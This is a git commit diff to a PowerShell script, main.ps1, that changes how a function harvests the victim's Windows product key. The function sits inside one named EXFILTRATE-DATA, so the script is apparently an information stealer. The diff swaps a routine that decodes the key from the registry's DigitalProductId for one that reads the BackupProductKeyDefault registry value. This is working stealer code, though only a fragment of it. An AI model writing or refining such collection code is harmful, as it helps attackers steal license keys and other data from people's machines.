c006d3e595db6caad14c284c0df2f57642574166
kdot227 <damndc227@gmail.com>
2023-05-19 16:34:15 -0500

    fix product key

--- main.ps1
+++ main.ps1
@@ -175,27 +175,14 @@ function EXFILTRATE-DATA {
     
 	#Extracts Product Key
     function Get-ProductKey {
-        $map = "BCDFGHJKMPQRTVWXY2346789"
-        $value = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42]
-        $ProductKey = ""
-        
-        for ($i = 24; $i -ge 0; $i--) {
-            $r = 0
-            
-            for ($j = 14; $j -ge 0; $j--) {
-                $r = ($r * 256) -bxor $value[$j]
-                $value[$j] = [math]::Floor([double]($r / 24))
-                $r = $r % 24
-            }
-            
-            $ProductKey = $map[$r] + $ProductKey
-        
-            if (($i % 5) -eq 0 -and $i -ne 0) {
-                $ProductKey = "-" + $ProductKey
-            }
+        try {
+            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
+            $keyName = 'BackupProductKeyDefault'
+            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
+            return $backupProductKey
+        } catch {
+            return "No product key found"
         }
-        
-        $ProductKey
     }
     
     $ProductKey = Get-ProductKey
